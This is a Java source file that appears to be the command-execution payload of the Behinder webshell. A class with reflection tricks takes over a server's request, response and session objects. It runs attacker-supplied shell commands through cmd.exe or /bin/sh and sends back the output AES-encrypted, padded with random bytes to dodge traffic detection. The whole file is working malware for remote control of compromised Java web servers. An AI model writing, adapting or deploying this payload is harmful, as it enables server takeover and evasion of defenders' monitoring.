package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Cmd {
    public static String cmd;
    public static String path;
    public static String status = "success";
    public static Object Request;
    public static Object Response;
    public static Object Session;

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<String, String>();
        try {
            fillContext(obj);
            result.put("msg", RunCMD(cmd));
            result.put("status", status);
            Method getOutputStream = Response.getClass().getMethod("getOutputStream", new Class[0]);
            Object so = getOutputStream.invoke(Response, new Object[0]);
            Method write = so.getClass().getMethod("write", new Class[] { byte[].class });
            write.invoke(so, new Object[] { Encrypt(buildJson(result, true).getBytes("UTF-8")) });
            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
        } catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }
        return true;
    }

    public static String RunCMD(String cmd) throws Exception {
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        if (path == null || path.length() == 0 || "whatever".equals(path)) {
            path = "";
        }
        boolean isWindows = System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0;
        String[] command = isWindows ? new String[] { "cmd.exe", "/c", cmd } : new String[] { "/bin/sh", "-c", cmd };
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream(), osCharset));
        BufferedReader stderr = new BufferedReader(new InputStreamReader(p.getErrorStream(), osCharset));
        StringBuilder result = new StringBuilder();
        String line;
        while ((line = stdout.readLine()) != null) {
            result.append(line).append("\n");
        }
        while ((line = stderr.readLine()) != null) {
            result.append(line).append("\n");
        }
        return result.toString();
    }

    public static byte[] Encrypt(byte[] bs) throws Exception {
        String key = Session.getClass().getMethod("getAttribute", new Class[] { String.class }).invoke(Session, new Object[] { "u" }).toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        bos.write(encrypted);
        bos.write(getMagic());
        return bos.toByteArray();
    }

    public static String base64encode(byte[] data) throws Exception {
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", new Class[0]).invoke(base64, new Object[0]);
            return encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(encoder, new Object[] { data }).toString();
        } catch (Throwable error) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(encoder, new Object[] { data }).toString().replace("\n", "").replace("\r", "");
        }
    }

    public static String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        Iterator<String> it = entity.keySet().iterator();
        while (it.hasNext()) {
            String key = it.next();
            sb.append("\"").append(key).append("\":\"");
            String value = entity.get(key);
            if (encode) {
                value = base64encode(value.getBytes("UTF-8"));
            }
            sb.append(value).append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    public static void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map) obj;
            Session = objMap.get("session");
            Response = objMap.get("response");
            Request = objMap.get("request");
        }
        Response.getClass().getMethod("setCharacterEncoding", new Class[] { String.class }).invoke(Response, new Object[] { "UTF-8" });
    }

    public static byte[] getMagic() throws Exception {
        String key = Session.getClass().getMethod("getAttribute", new Class[] { String.class }).invoke(Session, new Object[] { "u" }).toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        byte[] buf = new byte[magicNum];
        new Random().nextBytes(buf);
        return buf;
    }
}
